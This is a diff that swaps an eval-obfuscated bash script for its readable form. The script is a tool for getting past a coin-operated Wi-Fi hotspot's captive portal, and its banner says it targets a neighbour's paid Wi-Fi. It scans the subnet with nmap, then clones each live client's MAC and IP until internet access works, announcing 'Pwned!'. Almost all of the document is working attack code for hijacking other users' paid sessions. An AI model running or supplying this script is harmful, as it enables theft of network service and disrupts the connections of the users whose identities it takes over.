@@ -1,3 +1,133 @@
-z="
-";sHz='}'\'' \';aDz='w de';Tz='o  8';bHz='ne; ';mCz=''\''/in';jz='92m\';SIz='add ';BCz='way=';yJz='chec';tEz='e te';QJz='und.';IDz='mask';nCz='et/ ';LIz='ewma';aGz='o';sJz='ast"';TJz='g an';EEz='RROR';Zz='88o8';wGz='-PA ';tHz='" "T';dJz='ter ';lz='o  o';AJz='w yo';rCz='netm';PCz='4 ad';aJz='Try ';WHz='osts';CEz='%b\n';PJz='t fo';NDz='s/ {';FIz='ink ';HDz='"$ip';AGz='r ch';MGz='mp"/';WEz='tmp(';sz='o888';BGz='unks';nDz='func';fIz=' "$g';CBz='APIT';fGz='" "L';uz='PARA';uCz='f "%';SEz=' 1';LDz='k ad';cCz='sk="';ZGz='t; d';uGz='-PR ';HJz=' < "';QGz='xt';XFz='-Fi ';Mz='oo o';eFz='alc ';ADz=' -d ';Xz=' 88 ';cFz=' 24 ';Cz='echo';pHz='$hos';iCz=' "$i';hJz='er W';UFz='ifis';cIz=' def';NCz='dcas';bGz='t/24';iDz='| tr';lDz='r:]'\''';RGz=' mai';jHz='newm';NBz='show';gIz='ay"';UBz=' {pr';AIz='ipse';pGz='ase ';XJz='" "N';sCz='ask=';hFz='ork"';YEz='t tm';iz='888o';IGz='d "/';EDz='ddre';eDz=' /et';bDz='v "$';KBz='-o -';nJz='s"';CJz='n su';bCz='ipma';mEz='XX")';yHz='$new';gGz='ooki';qCz='4}'\'')';FCz='faul';GKz='main';dz=' 888';PFz='ring';YCz='rint';gBz='src/';hIz='slee';SGz='n() ';FBz='}';KDz='twor';MDz='dres';Hz='    ';WIz='adca';rFz='plit';sIz=' -eq';iHz='$1}'\''';gFz='4 "$';az='8   ';mJz='acad';DBz=' BAH';YJz='o lu';RDz='tadd';qz='  88';dDz='/ &&';ACz='gate';AKz='k_su';bFz=' -lt';OIz='ip a';aCz=''\'')"';xCz='k" |';OJz='s no';UDz='tmas';fDz='her/';rGz='nmap';FJz='net!';EHz=',"$g';MCz='broa';Iz='o   ';eJz='or t';rIz='[ $?';PHz='d '\''$';nEz='" ||';Nz='oooo';Oz=' \e[';PEz='do."';JEz='t be';ZJz='ck! ';GIz='set ';EBz='AY "';SBz='k '\''/';JBz='(ip ';hGz='ng f';RHz='/\n/';pCz='nt $';IFz='$tmp';PBz='defa';lBz='iw d';WDz='maca';oGz=' Ple';JJz='stsa';TIz='wips';mIz=' 8.8';BEz='tf "';fCz='-4 a';Vz='888 ';oEz=' {';QBz='ult ';LCz='}'\'')"';yDz=']]; ';kIz=' -c1';wCz='pmas';GGz=' | c';GCz='t | ';mz='oo8 ';wBz='t $N';wz='PISO';DEz='" "E';dFz='sipc';jBz='ssid';OFz='xplo';eIz=' via';mFz='"/ne';AEz='then';vGz='-PS ';GEz='s sc';eGz='sk"';RJz=' Che';QIz='h de';sEz='reat';rDz='udo(';gJz='noth';hz='  o8';KGz=' 1 >';OEz='e su';nIz='.8.8';uJz='r';SFz=' in ';QHz='!N;s';HBz='rfac';tGz='-sn ';VHz='p"/h';uDz='[ "$';xEz='er. ';cEz='ktem';Uz='8  8';pEz=' Una';Ez=' -e ';mHz='ntf ';bEz='"$(m';UEz=' cre';JFz='trap';QEz=' >&2';vJz='p 0 ';MHz='3}'\'' ';aHz='stli';yFz='alle';fz=' o88';FHz='atew';xGz='-PU ';lCz='" | ';IBz='e="$';DDz='neta';sBz='wk '\''';lGz='sts ';oHz='n" "';ZBz='lip=';XEz='unse';sFz='ting';NHz='\';MIz='cset';rEz='to c';oJz='" br';UIz='et/$';BBz='NG K';iGz='or a';xBz='F}'\'')';xIz='wned';UJz='othe';wEz='fold';qDz='ck_s';jFz='ork/';eEz='"${T';uFz='ork ';RBz='| aw';pIz='ev/n';JHz='$5} ';yCz=' cut';HHz='k" \';GHz='ay" ';rJz='"$br';kEz='ive_';qEz='ble ';bJz='agai';DCz='ow t';wDz='" -n';KCz='t $3';dEz='p -q';Bz='() {';WJz='unk.';iBz='wifi';pFz='.txt';KFz=' 0';bz=' 8oo';LHz='ss/ ';kz='e[1m';gEz='R:-/';qFz='" "S';RIz='e"';QDz='"$ne';tBz='/SSI';aIz='ip r';eHz='pset';nGz='ork.';jCz='nter';pJz='oadc';SHz=' - /';UHz='"$tm';gHz='line';iIz='p 1';cGz='t/$n';DJz='rf t';oDz='tion';RCz='how ';VJz='k ch';oz=' "';VBz='int ';qIz='ull';jEz='kapt';lFz=' > "';BHz='clud';hDz=' \';lIz=' -w1';ez='88o ';PIz='flus';IEz=' mus';jIz='ping';aBz='"$(i';LBz='4 ro';LEz=' as ';lHz='(pri';iEz='/hac';BJz='u ca';VDz='k"';EIz='ip l';EJz='he I';vIz='hen';BIz='t - ';OHz='| se';wHz=' hij';hBz='$7}'\''';ZFz='pot.';OCz='t="$';XGz='kfro';pBz='ce" ';FFz='{';cDz='e" \';qBz='link';THz=''\'' > ';fFz='-s 2';YFz='hots';tFz=' up ';cz='oo88';kFz='$3}'\''';bIz='oute';XDz=' -0 ';nBz='$int';dIz='ault';dCz='$(ip';iFz='Netw';YGz='mlis';vCz='s\n"';CIz='macs';ZDz=' sho';Gz='91m ';XBz=')"';qJz='ast ';xHz='ack ';pz='ooo8';vDz='EUID';ZCz=' $6}';xz=' WIF';VFz='sid\';EKz='calc';XHz='aliv';lJz=' "$m';lEz='XXXX';oFz='t.$$';ICz=''\''/vi';REz='exit';mDz='lowe';WCz='/brd';kJz='spot';gCz='ddr ';oIz=' >/d';GJz='done';PGz='$$.t';dBz='rout';GDz='$(';vEz='ary ';DHz='lip"';TGz='whil';MEz='root';WFz='" Wi';KIz=' "$n';nz='oo  ';hCz=' dev';iJz='i-Fi';MFz='c_ne';WBz='$5}'\''';vFz='$net';Fz='"\e[';gz='8o o';MBz='ute ';uEz='mpor';Pz='25m"';GBz='inte';tz=' ooo';WGz='r ne';HCz='awk ';Kz='ooo ';wJz='1 2 ';rHz='k '\''{';vz=' SA ';aFz='ask"';HFz='rf "';ZHz='r ho';PDz='ork=';KHz='; /A';Qz='   8';LGz=' "$t';aEz='tmp=';AHz='--ex';Jz='   o';eBz='e ge';Lz='  oo';uIz=']; t';Wz='  8 ';DFz='an_u';TEz='fi';CDz='-f 2';TCz='"$in';tDz='if [';nFz='klis';CCz='e sh';dHz='newi';XIz='st "';ECz='o de';TFz='\"$w';ODz='netw';YHz='e.$$';rz='8ooo';QFz=' net';qGz='wait';HGz='ut -';hHz=''\''{pr';cBz=' -4 ';CGz='."';pDz=' che';yz='I "';HIz=' dow';Rz='88  ';RFz='work';NJz='uita';Dz=' ""';FGz='" "$';fEz='MPDI';qHz='tlin';JDz=''\''/Ne';IIz='n';KEz=' run';JCz='a/ {';DGz='else';VIz=' bro';QCz='dr s';yEz='Abor';BFz='>&2';YDz='addr';IJz='"/ho';jDz=' '\''[:';TDz='/$ne';bBz='p -o';fBz='t 1 ';EFz='p() ';CKz='te_t';yIz='! No';dGz='etma';SCz='dev ';yGz='-T5 ';SDz='ress';YBz='loca';GFz='rm -';OBz=' to ';NGz='orkl';HEz='ript';mBz='ev "';ABz='8 88';eCz=' -o ';kHz='acse';xDz='e 0 ';VGz='ad -';AFz='t." ';IHz='for/';tCz='"$(p';KJz='live';DIz='et"';CHz='e "$';tIz=' 0 ]';oBz='erfa';NFz='k() ';DKz='mp';xFz='o sm';SJz='ckin';UGz='e re';ZEz='p';sGz=' -n ';VEz='ate_';oCz='{pri';EGz='%s\n';kCz='face';fHz='host';wIz='" "P';vBz='prin';kGz='e ho';gDz='$2}'\''';Yz='88 8';wFz=' int';yBz='"';BDz='"/" ';CFz=' cle';XCz='/ {p';FKz='_net';FEz=' Thi';NEz='. Us';vHz='g to';xJz='3 15';JGz='" -f';sDz=') {';uBz='D/ {';rBz=' | a';cHz='do';cJz='n la';kDz='uppe';hEz='tmp}';LFz=' cal';Az='logo';YIz='$bro';kBz='="$(';UCz='terf';fJz='ry a';JIz=' add';jJz=' hot';mGz='in $';OGz='ist.';TBz='dev/';Sz='8888';NIz=' up';VCz='ace"';nHz='"%s\';LJz='.$$.';BKz='crea';uHz='ryin';FDz='ss="';tJz='clea';ZIz='st" ';MJz='txt';jGz='ctiv';
-eval "$Az$Bz$z$Cz$Dz$z$Cz$Ez$Fz$Gz$Hz$Hz$Hz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Nz$Mz$Nz$Oz$Pz$z$Cz$Ez$Fz$Gz$Hz$Hz$Hz$Qz$Rz$Hz$Sz$Tz$Uz$Uz$Rz$Rz$Vz$Oz$Pz$z$Cz$Ez$Fz$Gz$Hz$Hz$Hz$Wz$Xz$Hz$Yz$Zz$az$Qz$Rz$Hz$Vz$Oz$Pz$z$Cz$Ez$Fz$Gz$Hz$Hz$Hz$bz$cz$Hz$Rz$dz$az$Qz$Rz$Hz$Vz$Oz$Pz$z$Cz$Ez$Fz$Gz$Hz$Hz$Jz$ez$fz$gz$ez$Qz$az$hz$ez$Jz$iz$Oz$Pz$z$Cz$Dz$z$Cz$Ez$Fz$jz$kz$Hz$Hz$Jz$Nz$Nz$lz$Nz$Lz$Nz$mz$Jz$Nz$nz$oz$z$Cz$Ez$Fz$jz$kz$Hz$Hz$Hz$Vz$Qz$Rz$Vz$dz$Hz$Hz$fz$az$iz$oz$z$Cz$Ez$Fz$jz$kz$Hz$Hz$Hz$iz$pz$az$Vz$qz$rz$Kz$dz$Hz$dz$oz$z$Cz$Ez$Fz$jz$kz$Hz$Hz$Hz$Vz$Hz$Hz$Vz$Hz$Hz$dz$dz$Iz$sz$oz$z$Cz$Ez$Fz$jz$kz$Hz$Hz$Jz$iz$Hz$Jz$iz$fz$Nz$Vz$Qz$rz$Rz$oz$z$Cz$Dz$z$Cz$Ez$Fz$jz$kz$Hz$Hz$Jz$Kz$Hz$Nz$tz$Mz$Nz$Nz$Mz$Nz$Hz$oz$z$Cz$Ez$Fz$jz$kz$Hz$Hz$Hz$Rz$Xz$Xz$qz$az$Vz$Qz$az$Vz$Hz$uz$vz$oz$z$Cz$Ez$Fz$jz$kz$Hz$Hz$Hz$Xz$Vz$Rz$qz$az$iz$mz$Hz$Vz$Hz$wz$xz$yz$z$Cz$Ez$Fz$jz$kz$Hz$Hz$Hz$qz$ABz$az$qz$az$Vz$Hz$Hz$Vz$Hz$BBz$CBz$DBz$EBz$z$Cz$Ez$Fz$jz$kz$Hz$Hz$Hz$Qz$Qz$Hz$fz$gz$iz$Hz$Jz$iz$Hz$oz$z$Cz$Dz$z$Cz$Dz$z$FBz$z$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$z$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$RBz$SBz$gBz$UBz$VBz$hBz$XBz$z$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$z$ACz$BCz$aBz$bBz$cBz$dBz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$vBz$KCz$LCz$z$MCz$NCz$OCz$JBz$KBz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$rBz$sBz$WCz$XCz$YCz$ZCz$aCz$z$bCz$cCz$dCz$eCz$fCz$gCz$NBz$hCz$iCz$jCz$kCz$lCz$HCz$mCz$nCz$oCz$pCz$qCz$yBz$z$rCz$sCz$tCz$YCz$uCz$vCz$iCz$wCz$xCz$yCz$ADz$BDz$CDz$XBz$z$DDz$EDz$FDz$GDz$z$HDz$IDz$lCz$HCz$JDz$KDz$LDz$MDz$NDz$vBz$wBz$xBz$yBz$z$ODz$PDz$QDz$RDz$SDz$TDz$UDz$VDz$z$WDz$EDz$FDz$dCz$XDz$YDz$ZDz$aDz$bDz$GBz$HBz$cDz$z$RBz$SBz$qBz$dDz$eDz$fDz$UBz$VBz$gDz$hDz$z$iDz$jDz$kDz$lDz$jDz$mDz$lDz$XBz$z$nDz$oDz$pDz$qDz$rDz$sDz$z$tDz$uDz$vDz$wDz$xDz$yDz$AEz$z$vBz$BEz$CEz$DEz$EEz$FEz$GEz$HEz$IEz$JEz$KEz$LEz$MEz$NEz$OEz$PEz$QEz$z$REz$SEz$z$TEz$z$FBz$z$nDz$oDz$UEz$VEz$WEz$sDz$z$XEz$YEz$ZEz$z$aEz$bEz$cEz$dEz$ADz$eEz$fEz$gEz$hEz$iEz$jEz$kEz$lEz$lEz$mEz$nEz$oEz$z$vBz$BEz$CEz$DEz$EEz$pEz$qEz$rEz$sEz$tEz$uEz$vEz$wEz$xEz$yEz$AFz$BFz$z$REz$SEz$z$FBz$z$FBz$z$nDz$oDz$CFz$DFz$EFz$FFz$z$GFz$HFz$IFz$yBz$z$JFz$KFz$z$REz$z$FBz$z$nDz$oDz$LFz$MFz$KDz$NFz$FFz$z$vBz$BEz$CEz$DEz$OFz$PFz$QFz$RFz$SFz$TFz$UFz$VFz$WFz$XFz$YFz$ZFz$yBz$z$tDz$uDz$rCz$aFz$bFz$cFz$yDz$AEz$z$dFz$eFz$fFz$gFz$ODz$hFz$hDz$z$RBz$SBz$iFz$jFz$UBz$VBz$kFz$lFz$IFz$mFz$KDz$nFz$oFz$pFz$z$vBz$BEz$CEz$qFz$rFz$sFz$tFz$ODz$uFz$vFz$RFz$wFz$xFz$yFz$AGz$BGz$CGz$z$DGz$z$vBz$BEz$EGz$FGz$ODz$hFz$GGz$HGz$IGz$JGz$KGz$LGz$MGz$ODz$NGz$OGz$PGz$QGz$z$TEz$z$FBz$z$nDz$oDz$RGz$SGz$FFz$z$TGz$UGz$VGz$WGz$KDz$XGz$YGz$ZGz$aGz$z$tDz$uDz$rCz$aFz$bFz$cFz$yDz$AEz$z$ODz$PDz$QDz$KDz$XGz$YGz$bGz$yBz$z$DGz$z$ODz$PDz$QDz$KDz$XGz$YGz$cGz$dGz$eGz$z$TEz$z$vBz$BEz$CEz$fGz$gGz$hGz$iGz$jGz$kGz$lGz$mGz$ODz$nGz$oGz$pGz$qGz$CGz$z$rGz$sGz$tGz$uGz$vGz$wGz$xGz$yGz$AHz$BHz$CHz$YBz$DHz$EHz$FHz$GHz$QDz$KDz$HHz$z$RBz$SBz$IHz$UBz$VBz$JHz$KHz$EDz$LHz$oCz$pCz$MHz$NHz$z$OHz$PHz$QHz$RHz$SHz$THz$UHz$VHz$WHz$XHz$YHz$pFz$z$TGz$UGz$VGz$ZHz$aHz$bHz$cHz$z$dHz$eHz$kBz$vBz$BEz$EGz$FGz$fHz$gHz$lCz$HCz$hHz$VBz$iHz$XBz$z$jHz$kHz$OCz$lHz$mHz$nHz$oHz$pHz$qHz$cDz$z$RBz$rHz$vBz$KCz$sHz$z$iDz$jDz$kDz$lDz$jDz$mDz$lDz$XBz$z$vBz$BEz$CEz$tHz$uHz$vHz$wHz$xHz$yHz$AIz$BIz$yHz$CIz$DIz$z$EIz$FIz$GIz$TCz$UCz$VCz$HIz$IIz$z$EIz$FIz$GIz$SCz$TCz$UCz$VCz$JIz$SDz$KIz$LIz$MIz$yBz$z$EIz$FIz$GIz$TCz$UCz$VCz$NIz$z$OIz$gCz$PIz$QIz$bDz$GBz$HBz$RIz$z$OIz$gCz$SIz$QDz$TIz$UIz$rCz$aFz$VIz$WIz$XIz$YIz$WIz$ZIz$SCz$TCz$UCz$VCz$z$aIz$bIz$JIz$cIz$dIz$eIz$fIz$FHz$gIz$z$hIz$iIz$z$jIz$kIz$lIz$mIz$nIz$oIz$pIz$qIz$z$tDz$rIz$sIz$tIz$uIz$vIz$z$vBz$BEz$CEz$wIz$xIz$yIz$AJz$BJz$CJz$DJz$EJz$jCz$FJz$yBz$z$REz$KFz$z$TEz$z$GJz$HJz$IFz$IJz$JJz$KJz$LJz$MJz$z$GFz$HFz$IFz$IJz$JJz$KJz$LJz$MJz$z$vBz$BEz$CEz$qFz$NJz$qEz$fHz$OJz$PJz$QJz$RJz$SJz$TJz$UJz$WGz$KDz$VJz$WJz$yBz$z$GJz$HJz$IFz$mFz$KDz$nFz$oFz$pFz$z$GFz$HFz$IFz$mFz$KDz$nFz$oFz$pFz$z$vBz$BEz$CEz$XJz$YJz$ZJz$aJz$bJz$cJz$dJz$eJz$fJz$gJz$hJz$iJz$jJz$kJz$CGz$z$EIz$FIz$GIz$TCz$UCz$VCz$HIz$IIz$z$EIz$FIz$GIz$SCz$TCz$UCz$VCz$JIz$SDz$lJz$mJz$MDz$nJz$z$EIz$FIz$GIz$TCz$UCz$VCz$NIz$z$OIz$gCz$PIz$QIz$bDz$GBz$HBz$RIz$z$OIz$gCz$SIz$HDz$IDz$oJz$pJz$qJz$rJz$pJz$sJz$hCz$iCz$jCz$kCz$yBz$z$aIz$bIz$JIz$cIz$dIz$eIz$fIz$FHz$gIz$z$FBz$z$tJz$uJz$z$Az$z$JFz$CFz$DFz$vJz$wJz$xJz$z$yJz$AKz$cHz$z$BKz$CKz$DKz$z$EKz$FKz$RFz$z$GKz"
+logo() {
+echo ""
+echo -e "\e[91m                 o      oooo   oooo ooooooooooo ooooo \e[25m"
+echo -e "\e[91m                888      8888o  88  88  888  88  888  \e[25m"
+echo -e "\e[91m               8  88     88 888o88      888      888  \e[25m"
+echo -e "\e[91m              8oooo88    88   8888      888      888  \e[25m"
+echo -e "\e[91m            o88o  o888o o88o    88     o888o    o888o \e[25m"
+echo ""
+echo -e "\e[92m\e[1m           oooooooooo  ooooo  oooooooo8    ooooooo   "
+echo -e "\e[92m\e[1m            888    888  888  888         o888   888o "
+echo -e "\e[92m\e[1m            888oooo88   888   888oooooo  888     888 "
+echo -e "\e[92m\e[1m            888         888          888 888o   o888 "
+echo -e "\e[92m\e[1m           o888o       o888o o88oooo888    88ooo88   "
+echo ""
+echo -e "\e[92m\e[1m           oooo     oooo ooooo ooooooooooo ooooo     "
+echo -e "\e[92m\e[1m            88   88  88   888   888    88   888     PARA SA  "
+echo -e "\e[92m\e[1m             88 888 88    888   888ooo8     888     PISO WIFI "
+echo -e "\e[92m\e[1m              888 888     888   888         888     NG KAPIT BAHAY "
+echo -e "\e[92m\e[1m               8   8     o888o o888o       o888o     "
+echo ""
+echo ""
+}
+
+interface="$(ip -o -4 route show to default | awk '/dev/ {print $5}')"
+localip="$(ip -o -4 route get 1 | awk '/src/ {print $7}')"
+wifissid="$(iw dev "$interface" link | awk '/SSID/ {print $NF}')"
+gateway="$(ip -o -4 route show to default | awk '/via/ {print $3}')"
+broadcast="$(ip -o -4 addr show dev "$interface" | awk '/brd/ {print $6}')"
+ipmask="$(ip -o -4 addr show dev "$interface" | awk '/inet/ {print $4}')"
+netmask="$(printf "%s\n" "$ipmask" | cut -d "/" -f 2)"
+netaddress="$(sipcalc "$ipmask" | awk '/Network address/ {print $NF}')"
+network="$netaddress/$netmask"
+macaddress="$(ip -0 addr show dev "$interface" \
+              | awk '/link/ && /ether/ {print $2}' \
+              | tr '[:upper:]' '[:lower:]')"
+
+# Check for running as root.
+function check_sudo() {
+  if [[ "$EUID" -ne 0 ]]; then
+    printf "%b\n" "ERROR This script must be run as root. Use sudo." >&2
+    exit 1
+  fi
+}
+
+# Create a temporary folder for script work.
+function create_tmp() {
+  unset tmp
+  tmp="$(mktemp -q -d "${TMPDIR:-/tmp}/hackaptive_XXXXXXXXXX")" || {
+    printf "%b\n" "ERROR Unable to create temporary folder. Abort." >&2
+    exit 1
+  }
+}
+
+# Clean tmp/ on exit due to any reason.
+function clean_up() {
+  rm -rf "$tmp"
+  trap 0
+  exit
+}
+
+# Split up big networks into smaller chunks of /24.
+function calc_network() {
+  printf "%b\n" "Exploring network in \"$wifissid\" Wi-Fi hotspot."
+  if [[ "$netmask" -lt 24 ]]; then
+    sipcalc -s 24 "$network" \
+    | awk '/Network/ {print $3}' > "$tmp"/networklist.$$.txt
+    printf "%b\n" "Splitting up network $network into smaller chunks."
+  else
+    printf "%s\n" "$network" | cut -d "/" -f 1 > "$tmp"/networklist.$$.txt
+  fi
+}
+
+# Select network, set netmask, scan it for IP and MAC and hijack them. Repeat.
+function main() {
+  while read -r networkfromlist; do
+    if [[ "$netmask" -lt 24 ]]; then
+      network="$networkfromlist/24"
+    else
+      network="$networkfromlist/$netmask"
+    fi
+
+  # Scan selected network for active hosts.
+  printf "%b\n" "Looking for active hosts in $network. Please wait."
+  nmap -n -sn -PR -PS -PA -PU -T5 --exclude "$localip","$gateway" "$network" \
+  | awk '/for/ {print $5} ; /Address/ {print $3}' \
+  | sed '$!N;s/\n/ - /' > "$tmp"/hostsalive.$$.txt
+
+  # Set founded IP and MAC for wireless interface.
+    while read -r hostline; do
+      newipset="$(printf "%s\n" "$hostline" | awk '{print $1}')"
+      newmacset="$(printf "%s\n" "$hostline" \
+                   | awk '{print $3}' \
+                   | tr '[:upper:]' '[:lower:]')"
+      printf "%b\n" "Trying to hijack $newipset - $newmacset"
+      ip link set "$interface" down
+      ip link set dev "$interface" address "$newmacset"
+      ip link set "$interface" up
+      ip addr flush dev "$interface"
+      ip addr add "$newipset/$netmask" broadcast "$broadcast" dev "$interface"
+      ip route add default via "$gateway"
+      sleep 1
+
+      # Check if Google DNS pingable with our new IP and MAC.
+      ping -c1 -w1 8.8.8.8 >/dev/null
+      if [[ $? -eq 0 ]]; then
+        printf "%b\n" "Pwned! Now you can surf the Internet!"
+        exit 0
+      fi
+    done < "$tmp"/hostsalive.$$.txt
+    rm -rf "$tmp"/hostsalive.$$.txt
+    printf "%b\n" "Suitable hosts not found. Checking another network chunk."
+
+  done < "$tmp"/networklist.$$.txt
+  rm -rf "$tmp"/networklist.$$.txt
+  printf "%b\n" "No luck! Try again later or try another Wi-Fi hotspot."
+
+  # Restore original MAC and IP.
+  ip link set "$interface" down
+  ip link set dev "$interface" address "$macaddress"
+  ip link set "$interface" up
+  ip addr flush dev "$interface"
+  ip addr add "$ipmask" broadcast "$broadcast" dev "$interface"
+  ip route add default via "$gateway"
+}
+
+# Functions start here.
+clear
+logo
+trap clean_up 0 1 2 3 15
+check_sudo
+create_tmp
+calc_network
+main
